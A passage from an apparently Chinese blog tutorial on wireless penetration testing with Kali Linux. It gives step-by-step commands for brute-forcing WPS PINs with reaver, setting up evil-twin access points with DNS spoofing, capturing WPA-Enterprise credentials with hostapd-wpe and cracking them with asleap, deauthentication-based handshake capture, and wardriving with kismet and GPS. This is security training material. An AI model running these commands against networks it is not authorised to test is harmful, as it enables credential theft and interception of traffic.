 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wash -C -i -c 11 wlan0mon</span><br><span class="line"></span><br><span class="line">-C：忽略错误帧的报警</span><br><span class="line">-i：指定侦听网卡</span><br><span class="line">-c：指定工作信道</span><br></pre></td></tr></table></figure>
<p> 或</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng wlan0mon --wps</span><br></pre></td></tr></table></figure>
</li>
<li><p>爆破<code>PIN</code>码</p>
<p> 默认每分钟发送10次<code>PIN</code>码，防止触发锁定机制</p>
<p> 一旦触发锁定机制，可尝试耗尽<code>AP</code>连接数，令其重启并解除<code>WPS</code>锁定</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">reaver -i wlan0mon -b 00:00:00:00:00:00 -vv -c 11</span><br><span class="line"></span><br><span class="line">-i：指定使用的无线网卡</span><br><span class="line">-b：指定要爆破的AP</span><br><span class="line">-vv：显示更加详细的信息</span><br><span class="line">-c：指定工作信道</span><br><span class="line">-d：指定每发送一次PIN码的延迟时间(秒)</span><br></pre></td></tr></table></figure>
</li>
<li><p>秒破<code>PIN</code>码</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reaver -i wlan0mon -b 00:00:00:00:00:00 -vv -K 1</span><br><span class="line"></span><br><span class="line">-K 1：调用pixiewps命令秒级破解PIN，只针对于固定厂商的芯片，成功率较低</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取<code>PSK</code></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reaver -i wlan0mon -b 00:00:00:00:00:00 -vv -p PIN</span><br><span class="line"></span><br><span class="line">-p：指定已破解的PIN，用于获取PSK</span><br></pre></td></tr></table></figure>
</li>
</ol>
<hr>
<h2 id="综合自动化无线密码破解工具wifite"><a href="#综合自动化无线密码破解工具wifite" class="headerlink" title="综合自动化无线密码破解工具wifite"></a>综合自动化无线密码破解工具wifite</h2><hr>
<h2 id="EVIL-TWIN-AP-ROGUE-AP"><a href="#EVIL-TWIN-AP-ROGUE-AP" class="headerlink" title="EVIL TWIN AP/ROGUE AP"></a>EVIL TWIN AP/ROGUE AP</h2><p><img src="/images/KaliLinux_shentouceshi/wuxianshentou/40.png" alt="40.png"></p>
<ol>
<li><p>启动无线网卡侦听模式</p>
</li>
<li><p>伪造<code>AP</code></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">airbase-ng -c 11 --essid kifi-free wlan0mon</span><br><span class="line"></span><br><span class="line">-a：指定真实AP的MAC地址，利于完全伪造AP</span><br></pre></td></tr></table></figure>
</li>
</ol>
<ol start="3">
<li><p>安装网卡桥接工具包，使连接伪造AP的客户端与局域网内其他有线设备处于同一网络，可以连接互联网</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install bridge-utils</span><br></pre></td></tr></table></figure>
</li>
</ol>
<ol start="4">
<li><p>设置网桥</p>
<p> <img src="/images/KaliLinux_shentouceshi/wuxianshentou/41.png" alt="41.png"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">brctl addbr bridge	# 添加网桥接口bridge</span><br><span class="line">brctl addif bridge eth0	# 添加网络接口至网桥中</span><br><span class="line">brctl addif bridge at0	# 添加网络接口至网桥中</span><br><span class="line">ifconfig eth0 0.0.0.0 up	# 将网桥两端网络接口IP抹掉</span><br><span class="line">ifconfig at0 0.0.0.0 up</span><br><span class="line">ifconfig bridge 10.1.1.101 up	# 将网桥激活</span><br><span class="line">route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.1.1.1	# 添加网关，使客户端连接真实路由获取IP地址</span><br></pre></td></tr></table></figure>
</li>
</ol>
<ol start="5">
<li><p>启动<code>IP</code>转发</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure>
</li>
</ol>
<ol start="6">
<li><p><code>DNS</code>欺骗</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dnsspoof -i bridge -f host</span><br><span class="line"></span><br><span class="line">-i：指定要欺骗的网络接口，所有经过此网络接口的流量都会进行DNS欺骗</span><br><span class="line">-f：指定要进行DNS欺骗的IP、域名对应关系文件</span><br></pre></td></tr></table></figure>
</li>
</ol>
<ol start="7">
<li>被攻击者连接伪造<code>AP</code></li>
</ol>
<h3 id="3vilTwinAttacker"><a href="#3vilTwinAttacker" class="headerlink" title="3vilTwinAttacker"></a>3vilTwinAttacker</h3><p>下载安装</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/P0cL4bs/3vilTwinAttacker.git</span><br><span class="line">cd 3vilTwinAttacker/</span><br><span class="line">dpkg -i isc-dhcp-server_4.3.1-6_amd64.deb</span><br><span class="line">cd 3vilTwinAttacker/</span><br><span class="line">chmod +x installer.sh</span><br><span class="line">./installer.sh --install</span><br></pre></td></tr></table></figure>
<p>映射无线网卡至虚拟机，无需配置无线网卡</p>
<p>启动</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3vilTwin-Attacker</span><br></pre></td></tr></table></figure>
<p><img src="/images/KaliLinux_shentouceshi/wuxianshentou/43.png" alt="43.png"></p>
<p>设置<code>3vilTwinAttacker</code>的<code>iptables</code>规则</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">删除2，3，4，5条规则</span><br><span class="line">增加</span><br><span class="line">iptables -t nat -A POSTROUTING -O eth0 -j MASQUERADE</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="WPA企业攻击"><a href="#WPA企业攻击" class="headerlink" title="WPA企业攻击"></a>WPA企业攻击</h2><h3 id="hostapd-wpe"><a href="#hostapd-wpe" class="headerlink" title="hostapd-wpe"></a>hostapd-wpe</h3><p><code>hostapd-wpe</code>为<code>hostapd</code>的补丁，用于完善功能，需基于<code>hostapd</code>使用</p>
<p>下载安装</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/OpenSecurityResearch/hostapd-wpe</span><br><span class="line">apt-get install libssl-dev</span><br><span class="line">wget http://ftp.debian.org/debian/pool/main/libn/libnl/libnl-dev_1.1-7_amd64.deb</span><br><span class="line">wget http://ftp.debian.org/debian/pool/main/libn/libnl/libnl1_1.1-7_amd64.deb</span><br><span class="line">dpkg -i libnl1_1.1-7_amd64.deb</span><br><span class="line">dpkg -i libnl-dev_1.1-7_amd64.deb</span><br><span class="line">wget http://hostap.epitest.fi/releases/hostapd-2.2.tar.gz</span><br><span class="line">tar -zxf hostapd-2.2.tar.gz</span><br><span class="line">cd hostapd-2.2</span><br><span class="line">patch -p1 &lt; ../hostapd-wpe/hostapd-wpe.patch</span><br><span class="line">cd hostapd</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
<p>生成证书</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ../../hostapd-wpe/certs</span><br><span class="line">./bootstrap</span><br></pre></td></tr></table></figure>
<p>修改配置文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">cd hostapd-2.2/hostapd/</span><br><span class="line">vim hostapd-wpe.conf</span><br><span class="line"></span><br><span class="line"># interface=eth0</span><br><span class="line">interface=wlan0		# 指定无线网卡</span><br><span class="line"></span><br><span class="line"># driver=wired</span><br><span class="line">driver=nl80211		# 指定无线网卡驱动</span><br><span class="line"></span><br><span class="line">ssid=kifi</span><br><span class="line">hw_mode=g</span><br><span class="line">channel=11</span><br></pre></td></tr></table></figure>
<p>运行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service network-manager stop</span><br><span class="line">airmon-ng check kill</span><br></pre></td></tr></table></figure>
<p>映射无线网卡</p>
<p>启动无线网卡</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig wlan0 up</span><br></pre></td></tr></table></figure>
<p>启动伪造<code>AP</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd hostapd-2.2/hostapd/</span><br><span class="line">./hostapd-wpe hostapd-wpe.conf</span><br></pre></td></tr></table></figure>
<p>当客户端连接伪造<code>AP</code>，输入用户名密码进行身份认证时，<code>hostapd-wpe</code>会抓取<code>username</code>、<code>challenge</code>、<code>response</code></p>
<p>密码破解</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">asleap -C challenge -R response -W a.txt</span><br><span class="line"></span><br><span class="line">-C：指定challenge的值</span><br><span class="line">-R：指定response的值</span><br><span class="line">-W：指定字典</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="aircrack-ng-suite其他工具"><a href="#aircrack-ng-suite其他工具" class="headerlink" title="aircrack-ng suite其他工具"></a>aircrack-ng suite其他工具</h2><h3 id="airdecap-ng"><a href="#airdecap-ng" class="headerlink" title="airdecap-ng"></a>airdecap-ng</h3><p>去除802.11头</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airdecap-ng -b &lt;AP MAC&gt; 1.cap</span><br></pre></td></tr></table></figure>
<p>解密<code>WEP</code>加密数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airdecap-ng -w &lt;WEP KEY&gt; -b &lt;AP MAC&gt; 1.cap</span><br></pre></td></tr></table></figure>
<p>解密<code>WEP</code>必须有与<code>AP</code>建立关联关系</p>
<p>解密<code>WPA</code>加密数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airdecap-ng -e kifi -p &lt;PSK&gt; -b &lt;AP MAC&gt; 1.cap</span><br></pre></td></tr></table></figure>
<p>解密<code>WPA</code>抓包文件中必须包含四步握手信息，否则无解</p>
<h3 id="airserv-ng"><a href="#airserv-ng" class="headerlink" title="airserv-ng"></a>airserv-ng</h3><p>通过网络提供无线网卡服务器</p>
<p>某些网卡不支持客户端/服务器模式</p>
<p>某些防火墙会影响<code>C/S</code>间的通信</p>
<p><img src="/images/KaliLinux_shentouceshi/wuxianshentou/44.png" alt="44.png"></p>
<p>服务器端启动无线网卡侦听</p>
<p>启动服务器端</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">airserv-ng -p 3333 -d wlan0mon</span><br><span class="line"></span><br><span class="line">-p：指定服务器端开放端口，默认为666端口</span><br></pre></td></tr></table></figure>
<p>启动客户端</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng IP:PORT</span><br><span class="line"></span><br><span class="line">此时会侦听服务器端无线网络范围的流量</span><br></pre></td></tr></table></figure>
<h3 id="airtun-ng"><a href="#airtun-ng" class="headerlink" title="airtun-ng"></a>airtun-ng</h3><ol>
<li><p>无线入侵检测系统(<code>wIDS</code>)</p>
<p> 需要无线密码和<code>BSSID</code>、获取握手信息</p>
</li>
<li><p>中继和重放(<code>Repeate/Replay</code>)</p>
<p> 无线信号中继、流量数据包重放</p>
</li>
</ol>
<h4 id="wIDS"><a href="#wIDS" class="headerlink" title="wIDS"></a>wIDS</h4><p>用作<code>wIDS</code>的终端需要靠近<code>AP</code>与客户端</p>
<p>当进行<code>wIDS</code>时，<code>AP</code>与客户端所有的通信流量都会被<code>wIDS</code>抓取到，解密进行分析</p>
<p>理论上一个无线网卡支持多<code>AP</code>的<code>wIDS</code>，但2个<code>AP</code>以上时可靠性会下降</p>
<h5 id="WEP"><a href="#WEP" class="headerlink" title="WEP"></a>WEP</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airtun-ng -a &lt;AP MAC&gt; -w &lt;WEP KEY&gt; wlan0mon</span><br></pre></td></tr></table></figure>
<h5 id="WPA"><a href="#WPA" class="headerlink" title="WPA"></a>WPA</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">airtun-ng -a &lt;AP MAC&gt; -p PSK -e kifi wlan0mon</span><br><span class="line">ifconfig at0 up		# at0会接收AP与其客户端的所有流量</span><br></pre></td></tr></table></figure>
<p>可以在<code>at0</code>后部署入侵检测系统，实时查看分析流量，也可以将流量数据包保存为<code>.pcap</code>,异地进行重放、分析、查看</p>
<h4 id="Repeate"><a href="#Repeate" class="headerlink" title="Repeate"></a>Repeate</h4><p>扩展无线侦听的距离</p>
<p>要求两块网卡都置为<code>monitor</code>模式</p>
<p>其中一块无线网卡用于收取无线信号，通过另一块无线网卡向另一个方向传输无线信号</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">airtun-ng -a &lt;AP MAC&gt; --repeat --bssid &lt;AP MAC&gt; -i wlan0mon wlan1mon</span><br><span class="line"></span><br><span class="line">-a：另一块网卡发包的源地址，即侦听AP的MAC地址</span><br><span class="line">--bssid：抓包可能会抓取多个AP的数据包，此参数用于过滤只发指定源地址的包(可选)</span><br><span class="line">-i：指定收包的无线网卡</span><br></pre></td></tr></table></figure>
<h4 id="Replay"><a href="#Replay" class="headerlink" title="Replay"></a>Replay</h4><p>将抓取的<code>cap</code>文件重放到指定网卡</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">airtun-ng -a &lt;AP MAC&gt; -r 1.cap &lt;interface&gt;</span><br><span class="line"></span><br><span class="line">-a：发包的源地址</span><br><span class="line">&lt;interface&gt;：指定用于接收重放的无线网卡接口</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="其他工具"><a href="#其他工具" class="headerlink" title="其他工具"></a>其他工具</h2><h3 id="bessid-ng"><a href="#bessid-ng" class="headerlink" title="bessid-ng"></a>bessid-ng</h3><p>对<code>AP</code>与<code>STATION</code>做<code>Deauthentication</code>攻击，抓取四步握手信息，只针对<code>WPA</code>加密方式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-b：指定AP的BSSID</span><br><span class="line">-s：将抓取的四步握手cap文件上传至其服务器(wpa.darkircop.org)，自动做密码破解</span><br></pre></td></tr></table></figure>
<h3 id="Fern-WIFI-Cracker"><a href="#Fern-WIFI-Cracker" class="headerlink" title="Fern WIFI Cracker"></a>Fern WIFI Cracker</h3><p>基于<code>Aircrack-ng</code>实现的图形化工具</p>
<hr>
<h2 id="无线侦察"><a href="#无线侦察" class="headerlink" title="无线侦察"></a>无线侦察</h2><h3 id="kismet"><a href="#kismet" class="headerlink" title="kismet"></a>kismet</h3><p>嗅探无线网络工具<code>Kismet</code>。使用该工具可以测量周围的无线信号，并查看所有可用的无线接入点</p>
<p><code>kismet</code>联动结合<code>GPS</code>模块，可生成<code>AP</code>物理坐标，通过转换可将坐标导入谷歌地球，实现无线侦察</p>
<p>当前目录下会生成以<code>kismet</code>开头的文件</p>
<ol>
<li><p><code>Kismet-time.nettxt</code>保存已侦察到的<code>AP</code>的相关信息</p>
</li>
<li><p><code>Kismet-time.netxml</code>保存已侦察到的<code>AP</code>信息与其<code>GPS</code>信息</p>
</li>
</ol>
<h3 id="GPS模块"><a href="#GPS模块" class="headerlink" title="GPS模块"></a>GPS模块</h3><p>安装<code>gspd</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install gpsd gpsd-clients</span><br></pre></td></tr></table></figure>
<ol>
<li><p>将<code>GPS</code>硬件模块映射</p>
</li>
<li><p><code>kill</code>原有<code>gpsd</code>进程</p>
</li>
<li><p>将<code>GPS</code>模块映射后，通过<code>dmesg</code>查看设备文件名称</p>
</li>
<li><p>获取定位信息</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  gpsd -n -N -D4 /dev/ttyUSB0</span><br><span class="line"></span><br><span class="line">-n：自动启动GPS模块</span><br><span class="line">-N：前台运行</span><br><span class="line">-D4：查看debug信息，4等级(最高等级5)</span><br><span class="line">/dev/ttyUSB0：GSP模块的设备文件名称</span><br></pre></td></tr></table></figure>
</li>
</ol>
<ol start="5">
<li><p>无线侦察,<code>kismet</code>会调用<code>gpsd</code>，对应<code>AP</code>信息与<code>GPS</code>信息</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kismet</span><br></pre></td></tr></table></figure>
</li>
</ol>
<ol start="6">
<li><p>将<code>.netxml</code>存有<code>AP</code>信息与<code>GPS</code>信息的文件进行处理，存储于<code>giskismet</code>的数据库</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">giskismet -x Kismet-time.netxml </span><br><span class="line"></span><br><span class="line">-x：表示要处理xml格式文件</span><br></pre></td></tr></table></figure>
</li>
</ol>
<ol start="7">
<li><p>从<code>giskismet</code>的数据库中查询</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">giskismet -q &quot;select * from wireless&quot; -o gps.kml</span><br><span class="line"></span><br><span class="line">-q：指定查询语句</span><br><span class="line">-o：指定输出文件</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="Google地球"><a href="#Google地球" class="headerlink" title="Google地球"></a>Google地球</h3><p>下载安装<code>kali</code>64位版本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://dl.google.com/dl/earth/client/current/google-earth-stable_current_amd64.deb</span><br><span class="line"></span><br><span class="line">dpkg -i google-earth64.deb</span><br><span class="line">apt-get -f install		# 安装google-earth所需依赖包</span><br></pre></td></tr></table></figure>

      
    </div>

    

    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/信息安全/" <i class="fa fa-tag"></i> 信息安全</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2018/11/24/deepin/" rel="next" title="deepin">
                <i class="fa fa-chevron-left"></i> deepin
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/01/14/迁移hexo至腾讯云/" rel="prev" title="迁移hexo至腾讯云">
                迁移hexo至腾讯云 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  
  <div>
	
		<div>
    
        <div style="text-align:center;color: #ccc;font-size:14px;">---------------The  End---------------</div>
    
</div>
	
  </div>
  </article>


  </div>


          </div>
          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">LoongEyes</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          
            <nav class="site-state motion-element">
              
                <div class="site-state-item site-state-posts">
                
                  <a href="/archives/">
                
                    <span class="site-state-item-count">84</span>
                    <span class="site-state-item-name">日志</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-categories">
                  <a href="/categories/index.html">
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">18</span>
                    <span class="site-state-item-name">分类</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-tags">
                  <a href="/tags/index.html">
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">19</span>
                    <span class="site-state-item-name">标签</span>
                  </a>
                </div>
              
            </nav>
          

          

          

          
          

          
          

          
            
          
          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#无线渗透"><span class="nav-number">1.</span> <span class="nav-text">无线渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#无线技术特点"><span class="nav-number">1.1.</span> <span class="nav-text">无线技术特点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#802-11标准"><span class="nav-number">1.2.</span> <span class="nav-text">802.11标准</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#802-11"><span class="nav-number">1.2.1.</span> <span class="nav-text">802.11</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#802-11b"><span class="nav-number">1.2.2.</span> <span class="nav-text">802.11b</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#802-11a"><span class="nav-number">1.2.3.</span> <span class="nav-text">802.11a</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#802-11g"><span class="nav-number">1.2.4.</span> <span class="nav-text">802.11g</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#802-11n"><span class="nav-number">1.2.5.</span> <span class="nav-text">802.11n</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#无线网络运行模式"><span class="nav-number">1.3.</span> <span class="nav-text">无线网络运行模式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Infrastructure"><span class="nav-number">1.3.1.</span> <span class="nav-text">Infrastructure</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#SSID-Service-Set-Identifier"><span class="nav-number">1.3.1.0.1.</span> <span class="nav-text">SSID(Service Set Identifier)</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AD-HOC"><span class="nav-number">1.3.2.</span> <span class="nav-text">AD-HOC</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#WIRELESS-DISTRIBUTION-SYSTEM-WDS"><span class="nav-number">1.3.2.0.1.</span> <span class="nav-text">WIRELESS DISTRIBUTION SYSTEM(WDS)</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MONITOR-MODE"><span class="nav-number">1.3.3.</span> <span class="nav-text">MONITOR MODE</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#无线网络硬件设备及基本概念"><span class="nav-number">1.4.</span> <span class="nav-text">无线网络硬件设备及基本概念</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#无线网卡准备"><span class="nav-number">1.4.1.</span> <span class="nav-text">无线网卡准备</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#台式机"><span class="nav-number">1.4.1.1.</span> <span class="nav-text">台式机</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#无线技术概念"><span class="nav-number">1.4.2.</span> <span class="nav-text">无线技术概念</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#分贝-dB"><span class="nav-number">1.4.2.1.</span> <span class="nav-text">分贝(dB)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#dBm"><span class="nav-number">1.4.2.2.</span> <span class="nav-text">dBm</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#dBi"><span class="nav-number">1.4.2.3.</span> <span class="nav-text">dBi</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#dBd"><span class="nav-number">1.4.2.4.</span> <span class="nav-text">dBd</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux无线协议栈及配置命令"><span class="nav-number">1.5.</span> <span class="nav-text">Linux无线协议栈及配置命令</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#802-11协议栈"><span class="nav-number">1.5.1.</span> <span class="nav-text">802.11协议栈</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#无线网卡配置"><span class="nav-number">1.5.2.</span> <span class="nav-text">无线网卡配置</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#查看无线网卡"><span class="nav-number">1.5.2.0.1.</span> <span class="nav-text">查看无线网卡</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#扫描附近AP"><span class="nav-number">1.5.2.0.2.</span> <span class="nav-text">扫描附近AP</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#添加删除网卡侦听接口"><span class="nav-number">1.5.2.0.3.</span> <span class="nav-text">添加删除网卡侦听接口</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RADIOTAP头部"><span class="nav-number">1.6.</span> <span class="nav-text">RADIOTAP头部</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Radiotap包头结构"><span class="nav-number">1.6.1.</span> <span class="nav-text">Radiotap包头结构</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#802-11头部"><span class="nav-number">1.7.</span> <span class="nav-text">802.11头部</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#概念"><span class="nav-number">1.7.1.</span> <span class="nav-text">概念</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#802-11-MAC头部"><span class="nav-number">1.7.2.</span> <span class="nav-text">802.11 MAC头部</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Frame-Control（帧控制域）"><span class="nav-number">1.7.2.1.</span> <span class="nav-text">Frame Control（帧控制域）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Duration-ID（持续时间-标识）"><span class="nav-number">1.7.2.2.</span> <span class="nav-text">Duration/ID（持续时间/标识）</span></a></li><li class="nav-item nav-level-4"><a 